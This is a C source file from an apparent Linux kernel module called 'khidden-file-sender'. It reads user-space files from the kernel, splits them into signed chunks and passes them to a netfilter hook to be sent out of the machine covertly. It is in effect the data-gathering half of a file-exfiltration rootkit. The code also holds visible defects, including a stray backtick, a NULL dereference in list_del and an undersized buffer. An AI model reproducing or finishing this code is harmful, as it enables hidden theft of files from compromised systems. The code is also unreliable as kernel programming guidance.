#include "payload_generator.h"
#include "file_metadata.h"
#include "../chrdev/chrdev.h"

#include <linux/fs.h>
#include <linux/uaccess.h>

static struct file_metadata current_file;

LIST_HEAD(current_file_chunks);

void initialize_file_metadata(struct file_metadata *current_file)
{
    current_file->file_path = NULL;
}

void read_file_chunks(struct file_metadata *current_file)
{
    printk(KERN_DEBUG "khidden-file-sender: in read_file_chunks\n");

    // open the file from user-space.
    // it is important to note that dealing with user-space files from the kernel is considered
    // to be a VERY bad practice. in this module we pretty much have to deal with files, but we
    // still do that with caution as it is sometimes counter-intuitive. Needless to say, there
    // is not much information on the internet.
    struct file *filp;
    filp = filp_open(current_file->file_path, O_RDONLY, 0);
    if (IS_ERR(filp)) {
        printk(KERN_ERR "khidden-file-sender: failed to open file. error: %d\n", PTR_ERR(filp)`);
        return;
    }
    
    // get the file size
    loff_t file_size = vfs_llseek(filp, 0, SEEK_END);
    loff_t current_position = vfs_llseek(filp, 0, 0);
    if (0 != current_position) {
        printk(KERN_ERR "khidden-file-sender: failed to seek back to file's beginning. file path: %s\n", current_file->file_path);
        return;
    }

    bool is_first_chunk = true;
    while (current_position < file_size) {
        struct file_chunk *new_chunk = (struct file_chunk *)kmalloc(sizeof(struct file_chunk), GFP_KERNEL);
        if (NULL == new_chunk) {
            goto cleanup;
        }

        new_chunk->data = (char *)kmalloc(get_default_payload_chunk_size(), GFP_KERNEL);
        if (NULL == new_chunk->data) {
            kfree(new_chunk);
            goto cleanup;
        }

        new_chunk->chunk_size = 0;

        size_t offset_in_buffer = 0;  // will include the signature if it is the first chunk.
        size_t available_space_in_chunk = get_default_payload_chunk_size();

        if (is_first_chunk) {
            // if it is the first chunk, we want to add a signature to it.
            struct new_file_signature signature;
            signature.file_size = file_size;
            memcpy(signature.signature, DEFAULT_NEW_FILE_SIGNATURE, sizeof(DEFAULT_NEW_FILE_SIGNATURE));

            memcpy(new_chunk->data, &signature, sizeof(struct new_file_signature));

            new_chunk->chunk_size += sizeof(struct new_file_signature);
            offset_in_buffer += sizeof(struct new_file_signature);
            available_space_in_chunk -= sizeof(struct new_file_signature);
            is_first_chunk = false;
        }

        ssize_t size_to_read = min(available_space_in_chunk, file_size - current_position);

        // read the file's content.
        // few important notes:
        //      1. traditionally, the common way of reading files in the kernel is by using VFS functions 
        //         like vfs_read. vfs_read invokes the f_ops of a given file to read it. in newer kernel
        //         versions, the functions kernel_read and kernel_write were introduced, replacing the "old" 
        //         vfs_XXX functions. using kernel_read and kernel_write is considered a good practice as it 
        //         eliminates the need of messing with the FS (explained in 2). however, and from a very 
        //         mysterious reason, kernel_read didn't work here - hence vfs_read is used.
        //      2. vfs_read expects to save the read data into a user-space buffer. in order to pass a 
        //         kernel-space allocated buffer to it, we need to overwriting the kernel' FS. by setting the
        //         kernel FS to KERNEL_DS, we actually tell it to expect a kernel-space buffer. note that
        //         restoring the old FS after the call to vfs_read is super-important, otherwise kernel panic
        //         will be caused.
        mm_segment_t security_old_fs = get_fs();
        set_fs(get_ds());
        ssize_t size_read = vfs_read(filp, new_chunk->data + offset_in_buffer, size_to_read, &current_position);
        set_fs(security_old_fs);

        // add the chunk to the list and update its size.
        list_add(&(new_chunk->l_head), &current_file_chunks);
        new_chunk->chunk_size += size_read;
    }

cleanup:
    filp_close(filp, NULL);
}

void process_next_pending_file(struct file_metadata *current_file)
{
    initialize_file_metadata(current_file);
    
    // check if there are pending files. if there isn't - return;
    mutex_lock(&pending_files_to_be_sent_mutex);
    bool is_list_empty = list_empty(&pending_files_to_be_sent);
    mutex_unlock(&pending_files_to_be_sent_mutex);
    if (is_list_empty) {
        return;    
    }

    // free the previous file path as we are going to process the next one.
    if (NULL != current_file->file_path) {
        kfree(current_file->file_path);
    }

    // acquire pending_files_to_be_sent mutex as we don't want anyone to mess
    // with our list while we are reading its head.
    mutex_lock(&pending_files_to_be_sent_mutex);
    struct file_metadata *next_pending_file;
    next_pending_file = list_first_entry_or_null(&pending_files_to_be_sent, struct file_metadata, l_head);
    if (NULL == next_pending_file) {
        list_del(&next_pending_file->l_head);
        goto release_mutex;
    }
    mutex_unlock(&pending_files_to_be_sent_mutex);

    // copy the file path
    size_t next_pending_file_path_length = strlen(next_pending_file->file_path);
    current_file->file_path = (char*)kmalloc(next_pending_file_path_length, GFP_KERNEL);
    if (NULL == current_file->file_path) {
        // if we fail to allocate space for the file path - we do not want to remove it from
        // the list so we will be able to reach it in the next time. if we'll delete it right 
        // now - then the file won't be sent.
        goto release_mutex;
    }
    memcpy(current_file->file_path, next_pending_file->file_path, next_pending_file_path_length + 1);
    current_file->file_path[next_pending_file_path_length] = 0x00;

    // remove the item from the list of pending files.
    // also, free it as we are responsible for its memory.
    mutex_lock(&pending_files_to_be_sent_mutex);
    list_del(&next_pending_file->l_head);
    mutex_unlock(&pending_files_to_be_sent_mutex);
    kfree(next_pending_file->file_path);
    kfree(next_pending_file);

    // TODO: support saving only X chunks (for dealing with large files)
    read_file_chunks(current_file);

    return;

release_mutex:
    mutex_unlock(&pending_files_to_be_sent_mutex);
}

int generate_payload(char *buffer, size_t *length)
{
    if ((NULL == buffer) || (NULL == length)) {
        return -EINVAL;
    }

    if (list_empty(&current_file_chunks)) {
        // if there are no more chunks to send, it means that we finished sending the file.
        // in this case we would like to process the next pending file (if exists) and start sending    
        // its payloads.
        process_next_pending_file(&current_file);
        return -EIO;
    }

    // there are chunks to send. 
    // read the first chunk, remove it from the list and return it to the caller.   
    struct file_chunk *next_chunk;
    next_chunk = list_first_entry_or_null(&current_file_chunks, struct file_chunk, l_head);
    if (NULL == next_chunk) {
        return -EIO;
    }

    // copy the chunk's data to the caller's buffer.
    memcpy(buffer, next_chunk->data, next_chunk->chunk_size);
    *length = next_chunk->chunk_size;
    
    // remove the chunk from the list and free it.
    // NOTE: we DO NOT want to free next_chunk->data as it is being used by the netfilter hook.
    //       it will be freed when skb_free is called (?).
    list_del(&(next_chunk->l_head));
    kfree(next_chunk);

    return 0;
}

void setup_payload_generator(void)
{
    // TODO: make atomic!
    get_payload_func = &generate_payload;
    initialize_file_metadata(&current_file);
}

size_t get_default_payload_chunk_size(void)
{
    // TODO: check if less then the size of struct signature
    return DEFAULT_PAYLOAD_CHUNKS_SIZE;
}